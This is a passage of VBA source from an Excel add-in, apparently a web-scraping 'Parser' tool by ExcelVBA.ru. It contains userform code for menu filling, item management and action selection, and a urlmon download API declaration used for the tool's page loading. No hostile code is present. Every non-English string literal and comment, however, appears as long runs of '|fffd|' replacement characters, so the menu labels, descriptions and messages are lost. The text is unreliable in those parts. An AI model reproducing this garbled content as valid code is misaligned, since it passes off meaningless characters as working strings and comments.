                    .value = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & URL$
                Else
                    URL$ = ActiveCell.value
                    .value = "|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & URL$
                End If
                If IsURL(URL$) Then
                    .value = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & URL$ & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|..."
                    .value = LoadFromURL_HTML(URL$, RunningParser)
                End If
                
            Case command$ Like "GetURLFromActiveCellAndRunSourceDataActions"
                URL$ = GetCellHyperlinkAddress(ActiveCell, True)
                If IsURL(URL$) Then
                    .value = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & URL$ & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|..."
                    v$ = URL$
                    RunningParser.SourceData.Actions.ApplyTo v$
                    .value = v$
                Else
                    .value = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                End If
                
                
            Case command$ Like "Set Value *"
                v$ = Split(command$, "Set Value ", 2)(1)
                .value = v$
                
        End Select
    End With
    field.SetFocus
    If NeedUpdateComboes Then Fill_SubMenu_Comboes
End Sub

Function GetSourceValueFromActiveCell() As Variant
    On Error Resume Next
    If RunningParser.SourceData.ColumnMode_UseCellText Then
        GetSourceValueFromActiveCell = ActiveCell.text
    Else
        If ActiveCell.Hyperlinks.Count Then
            GetSourceValueFromActiveCell = GetCellHyperlinkAddress(ActiveCell)
        Else
            GetSourceValueFromActiveCell = ActiveCell.value
        End If
    End If
End Function

Sub Fill_SubMenu_Comboes()
    Fill_SubMenu_Source
    Fill_SubMenu_Result
    
    Dim i&
    For i = 1 To 5
        With Me.ComboBox_CloneOptions
            .AddItem i: .list(i - 1, 1) = "Clone " & i
        End With
    Next
End Sub

Sub Fill_SubMenu_Source()        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| TEST SOURCE
    On Error Resume Next
    Dim ind&, dic As Dictionary, i&, cnt&, v$
    Set dic = LoadAddinClipboardValues
    
    'Dim x: Set x = Me.AAs
    'Stop
    
    With Me.AAs.ParentParser
        Set .Sheet = ActiveSheet
        cnt& = .SourceData.Items.Count: If cnt& = 0 Then cnt& = .SourceData.InitializeAllItems(True)
        cnt& = Application.min(cnt&, 8)
        If (.SourceData.Mode = ps_FixedValue) And (Trim(.SourceData.FixedValueMode_Value) = "") Then cnt& = 0
        If (.SourceData.Mode = ps_FixedValue) Then .SourceData.InitializeAllItems (True)
    End With
    
    
    ReDim arr(1 To 14 + dic.Count + IIf(cnt&, cnt& + 1, 0), 1 To 3)
    
    ind& = ind& + 1: arr(ind&, 1) = "GetFromActiveCell"
    arr(ind&, 2) = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    
    ind& = ind& + 1: arr(ind&, 1) = "GetURLFromActiveCellAndLoadPage"
    arr(ind&, 2) = "Load HTML using cell hyperlink"
    arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    
    ind& = ind& + 1: arr(ind&, 1) = "GetURLFromActiveCellAndRunSourceDataActions"
    arr(ind&, 2) = "Apply main actions to cell hyperlink"
    arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    
    ind& = ind& + 2: arr(ind&, 1) = "OpenInBrowser"
    arr(ind&, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| HTML"
    
    ind& = ind& + 1: arr(ind&, 1) = "OpenInBrowserAsXML"
    arr(ind&, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| XML"
    arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| XML"
    
    ind& = ind& + 1: arr(ind&, 1) = "OpenInNotepad"
    arr(ind&, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    
    ind& = ind& + 2: arr(ind&, 1) = "ShowConstants"
    arr(ind&, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| {NL}, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| {TAB}, |fffd| |fffd|.|fffd|."
    
    ind& = ind& + 1: arr(ind&, 1) = "RenderConstants"
    arr(ind&, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| {NL} |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, {TAB} |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd|.|fffd|."
    
    ind& = ind& + 1: arr(ind&, 1) = "ShowCookies"
    arr(ind&, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookies"
    arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookies"
    
    ind& = ind& + 1: arr(ind&, 1) = "ShowRequestHeaders"
    arr(ind&, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    
    ind& = ind& + 2: arr(ind&, 1) = "Save Clipboard " & dic.Count + 1
    arr(ind&, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| #" & dic.Count + 1
    
    For i = 1 To dic.Count
        ind& = ind& + 1: arr(ind&, 1) = "Get Clipboard " & i
        arr(ind&, 2) = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| #" & i
        arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| " & ValueDescription(dic.item(i))
    Next
    
    If cnt& Then
        ind& = ind& + 1        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        With Me.AAs.ParentParser
            For i = 1 To cnt&
                v$ = .SourceData.Items(i).value        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                If Len(Trim(v$)) Then
                    ind& = ind& + 1: arr(ind&, 1) = "Set Value " & v$
                    arr(ind&, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| #" & i
                    arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & Left(v$, 50)
                End If
            Next
        End With
    End If
    
    Me.ComboBox_SubMenu_Source.list = arr
    Me.ComboBox_SubMenu_Source.ListRows = Application.min(UBound(arr), 20)
End Sub

Sub Fill_SubMenu_Result()        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| TEST RESULT
    On Error Resume Next
    Dim ind&, dic As Dictionary: ReDim arr(1 To 5, 1 To 3)
    Set dic = LoadAddinClipboardValues
    
    ind& = ind& + 1: arr(ind&, 1) = "ShowConstants"
    arr(ind&, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| {NL}, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| {TAB}, |fffd| |fffd|.|fffd|."
    
    ind& = ind& + 1: arr(ind&, 1) = "RenderConstants"
    arr(ind&, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| {NL} |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, {TAB} |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd|.|fffd|."
    
    
    ind& = ind& + 2: arr(ind&, 1) = "Save Clipboard " & dic.Count + 1
    arr(ind&, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| #" & dic.Count + 1
    
    If dic.Count Then
        ind& = ind& + 1: arr(ind&, 1) = "Clear Clipboard"
        arr(ind&, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        arr(ind&, 3) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (" & dic.Count & ") |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End If
    
    Me.ComboBox_SubMenu_Result.list = arr
    Me.ComboBox_SubMenu_Result.ListRows = Application.min(UBound(arr), 20)
    Me.ComboBox_SubMenu_Result2.list = arr
    Me.ComboBox_SubMenu_Result2.ListRows = Application.min(UBound(arr), 20)
    
End Sub

Sub ExtendTestFields()
    On Error Resume Next
    Dim BigSize As Boolean, zo&: BigSize = SETT.GetBoolean("ExtendedResultField", False)
    zo = SETT.GetNumber("ComboBox_Zoom", 100)
    If zo < 40 Then zo = 100
    Me.Width = IIf(BigSize, 960, 600) * zo / 100
    Me.TextBox_TestSource.Height = IIf(BigSize, 123, 45)
    Me.Show
End Sub

Attribute VB_Name = "FP_Objects"
Attribute VB_Base = "0{1795EC6A-5B4D-4654-A5D9-2C1B75E81CA4}{2889FF31-0057-413D-B773-1EFF45B9326F}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : FP_Objects                    Version:
' Author        : Igor Vakhnenko                   Date: 02.10.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Public SelectedItem As Object, All_Items As Object, MacroOnClose As String

Public SELECT_MODE As Boolean ' |fffd||fffd||fffd||fffd| TRUE, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|

Sub EnableSelectMode(ByVal ButtonName$, ByVal Action$)
    SELECT_MODE = True
    SelectedObjectName_F_Objects = ""
    With Me.CommandButton_Select
        .Caption = ButtonName$
        .Visible = True
    End With
End Sub

Sub FillSelectedItemParameters()
    On Error Resume Next
    Me.Frame_SelectedItemProperties.Visible = True
    With SelectedItem
        Me.ListBox_Parameters.list = .ToArray
    End With
End Sub

Private Sub CommandButton_Cancel_Click()
    Unload Me
End Sub

Private Sub CommandButton_Clone_Click()
    On Error Resume Next: SelectedItem.Clone
    RefreshItemsList
End Sub

Private Sub CommandButton_Create_Click()
    On Error Resume Next
    Dim i&, NewItem$
    Set SelectedItem = All_Items.Add("", "")
    NewItem$ = SelectedItem.Name
    RefreshItemsList
    
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    For i = 0 To Me.ListBox_Items.ListCount - 1
        If Me.ListBox_Items.list(i, 1) = NewItem$ Then Me.ListBox_Items.ListIndex = i: Exit For
    Next
End Sub

Private Sub CommandButton_Edit_Click()
    On Error Resume Next: SelectedItem.Edit
End Sub

Private Sub CommandButton_Remove_Click()
    On Error Resume Next
    Dim ListIndex&: ListIndex& = Me.ListBox_Items.ListIndex
    SelectedItem.Delete
    Set SelectedItem = Nothing
    Me.Initialize
    Err.Clear: Me.ListBox_Items.ListIndex = ListIndex&
    If Err Then Me.ListBox_Items.ListIndex = ListIndex& - 1
End Sub

Private Sub CommandButton_Select_Click()
    On Error Resume Next
    SelectedObjectName_F_Objects = Me.ListBox_Items.list(Me.ListBox_Items.ListIndex, 1)
    Unload Me
End Sub

Sub ListBox_Items_Click()
    On Error Resume Next
    Set SelectedItem = Me.All_Items.GetItemByName(Me.ListBox_Items.list(Me.ListBox_Items.ListIndex, 1))
    FillSelectedItemParameters
    EnableButtons True
End Sub

Sub EnableButtons(ByVal Enable As Boolean)
    On Error Resume Next: Err.Clear
    Dim arr: arr = Me.All_Items.SupportedInterfaces ' ARRAY ( CREATE, EDIT, CLONE, DELETE )
    Me.CommandButton_Create.Enabled = arr(0)
    Me.CommandButton_Edit.Enabled = Enable And arr(1) And (Not SELECT_MODE)
    Me.CommandButton_Clone.Enabled = Enable And arr(2)
    Me.CommandButton_Remove.Enabled = Enable And arr(3) And (Not SELECT_MODE)
    Me.CommandButton_Select.Enabled = Enable
End Sub

Sub Initialize()
    On Error Resume Next
    UserForm_AddCollapseButton Me.Caption
    ApplyZoomTo Me
    RefreshItemsList
    Me.ListBox_Items.ListIndex = 0
End Sub

Sub RefreshItemsList()
    On Error Resume Next: Err.Clear
    Dim SelectedItemIndex&: SelectedItemIndex& = Me.ListBox_Items.ListIndex
    Me.ListBox_Items.Clear
    Me.ListBox_Items.list = All_Items.ArrayOfIndexesAndNames
    If Err.Number = 438 Then MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| ArrayOfIndexesAndNames", vbCritical: Exit Sub
    Me.Frame_SelectedItemProperties.Visible = Me.ListBox_Items.ListCount > 0
    If Me.ListBox_Items.ListCount = 1 Then SelectedItemIndex& = 0
    Me.ListBox_Items.ListIndex = SelectedItemIndex&
    EnableButtons Me.ListBox_Items.ListCount > 0
End Sub

Private Sub UserForm_Activate()
    On Error Resume Next
    If Me.ListBox_Items.ListCount > 0 Then ListBox_Items_Click
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If Len(Me.MacroOnClose) Then Application.Run Me.MacroOnClose
End Sub

Attribute VB_Name = "FP_SelectAction"
Attribute VB_Base = "0{AD3A725F-3E96-442A-B5D2-47395653BD99}{1E6463A8-3EBD-4A7D-80DB-AE65336F0A14}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : FP_SelectAction                    Version:
' Author        : Igor Vakhnenko                   Date: 02.10.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit

Public AAs As ArrayActions, StopEvents As Boolean

Private Sub CheckBox_FavouriteAction_Click()
    On Error Resume Next: If Me.StopEvents Then Exit Sub
    Dim Codename$: Codename$ = Me.ListBox_Actions.value
    If Codename$ <> "" Then ChangeFavouriteActionsList Codename$, Me.CheckBox_FavouriteAction.value
End Sub

Private Sub CommandButton_Cancel_Click()
    Unload Me
End Sub

Sub CommandButton_OK_Click()
    On Error Resume Next
    SelectedActionCodename$ = Me.CommandButton_OK.Tag
    AddActionIntoLastUsedList SelectedActionCodename$
    Unload Me
End Sub

Private Sub Label_OnlineManual_Click()
    On Error Resume Next
    Dim URL$
    URL$ = "https://excelvba.ru/programmes/Parser/actions/" & Me.Label_OnlineManual.Tag
    If URL$ Like "*/+*" Then
        URL$ = Replace(URL$, "+", "")
        URL$ = Replace(URL$, "/actions/", "/plugins/")
    End If
    FollowHyperlink URL$
End Sub

Private Sub Label195_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/action_editor/add"
End Sub

Private Sub ListBox_Actions_Change()
    On Error Resume Next
    Dim Codename$: Codename$ = Me.ListBox_Actions.value
    Me.CommandButton_OK.Tag = Codename$
    Me.CommandButton_OK.Enabled = Codename$ <> ""
    Me.CheckBox_FavouriteAction.Visible = Codename$ <> ""
    Me.Frame_info.Visible = Codename$ <> ""
    Me.Height = IIf(Codename$ <> "", 446, 302)
    If Codename$ <> "" Then
        With Me.AAs.GetItemByCodename(Codename$)
            Me.TextBox_Decription = .Description
            Me.Label_Parameters.Caption = .GetParameterNamesList
            Me.Label_OnlineManual.Visible = True '.HasManual
            Me.Label_OnlineManual.Tag = Replace(.Source, " ", "_") & "/" & Codename$
        End With
        
        Me.StopEvents = True
        Me.CheckBox_FavouriteAction.value = IsFavouriteAction(Codename$)
        Me.StopEvents = False
    End If
End Sub

Private Sub ListBox_Actions_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    On Error Resume Next
    Dim Codename$: Codename$ = Me.ListBox_Actions.value
    If Codename$ <> "" Then CommandButton_OK_Click
End Sub

Private Sub ListBox_Categories_Click()
    On Error Resume Next
    Dim cat&, arr As Variant, i&, aa As ArrayAction, CodenamesArray As Variant, txt$
    cat& = Me.ListBox_Categories.value
    
    Select Case cat&
        
        Case 0        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            Dim AllCategories As Collection, Category As Variant, CategoriesColl As New Collection
            Set AllCategories = Me.AAs.GetAllCategories
            'Debug.Print Me.AAs.Items.Count + AllCategories.Count * 2, Me.AAs.Items.Count, AllCategories.Count
            ReDim arr(1 To Me.AAs.Items.Count + AllCategories.Count, 0 To 1)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            
            For Each Category In AllCategories
                For Each aa In Me.AAs.Items
                    If aa.Category = Val(Category) Then
                        Err.Clear: CategoriesColl.Add 0, CStr(Category)
                        If Err = 0 Then i = i + 1: arr(i, 1) = Me.AAs.GetFunctionCategoryTXT(Val(Category))
                        i = i + 1
                        With aa
                            arr(i, 1) = "        " & .Name
                            arr(i, 0) = .Codename
                        End With
                    End If
                Next
            Next Category
            SETT.SetText "LastActionsCategory", 0
            
        Case -1, -2        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (-1), |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 10 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (-2)
            If cat& = -1 Then CodenamesArray = Split(SETT.GetText("FavouritesActions"), ";")
            If cat& = -2 Then CodenamesArray = Split(SETT.GetText("LastUsedActions"), ";")
            
            ReDim arr(0 To UBound(CodenamesArray), 0 To 1)
            With Me.AAs
                For i = LBound(arr) To UBound(arr)
                    arr(i, 0) = CodenamesArray(i)
                    arr(i, 1) = .GetItemByCodename(CodenamesArray(i)).Name
                Next i
            End With
            SETT.SetText "LastActionsCategory", Abs(cat&)
            
        Case -999        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            
            
        Case Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            For Each aa In Me.AAs.Items
                If aa.Category = cat& Then i = i + 1
            Next
            If i Then
                ReDim arr(1 To i, 0 To 1)
                i = 0
                For Each aa In Me.AAs.Items
                    If aa.Category = cat& Then
                        i = i + 1
                        With aa
                            arr(i, 1) = "" & .Name
                            arr(i, 0) = .Codename
                        End With
                    End If
                Next
            End If
            SETT.SetText "LastActionsCategory", Me.ListBox_Categories.ListIndex
    End Select
    
    Me.ListBox_Actions.Clear
    Me.ListBox_Actions.list = arr
    Me.ListBox_Actions.SetFocus
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next
    Dim arr As Variant, AllCategories As Collection, i&, inc&
    Set Me.AAs = All_AAs
    
    Set AllCategories = Me.AAs.GetAllCategories
    ReDim CatArr(0 To AllCategories.Count + 5, 0 To 1)
    
    For i = 1 To AllCategories.Count
        inc& = IIf(AllCategories(i) <= 20, 3, IIf(AllCategories(i) < 50, 4, 5))
        CatArr(i + inc&, 0) = AllCategories(i)
        CatArr(i + inc&, 1) = Me.AAs.GetFunctionCategoryTXT(Val(AllCategories(i)))
    Next i
    
    CatArr(0, 0) = 0: CatArr(0, 1) = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    CatArr(1, 0) = -1: CatArr(1, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    CatArr(2, 0) = -2: CatArr(2, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 10 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    
    For i = LBound(CatArr) To UBound(CatArr)
        If CatArr(i, 1) = "" Then CatArr(i, 0) = -999 ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    Next i
    
    
    Me.ListBox_Categories.list = CatArr
    Me.ListBox_Categories.ListIndex = SETT.GetNumber("LastActionsCategory", 0)
    
    Set AllCategories = Nothing
    ApplyZoomTo Me
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    Set Me.AAs = Nothing
End Sub

Attribute VB_Name = "FWF"
'---------------------------------------------------------------------------------------
' Module        : FWF                    Version: 2
' Author        : Igor Vakhnenko                   Date: 25.12.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module: Option Compare Text: Option Explicit

#If VBA7 Then        '  Office 2010-2013
    Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
            (ByVal pCaller As LongPtr, ByVal szURL As String, ByVal szFileName As String, _
             ByVal dwReserved As LongPtr, ByVal lpfnCB As LongPtr) As LongPtr
#Else        '  Office 2003-2007
    Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
                                       (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, _
                                        ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
#End If

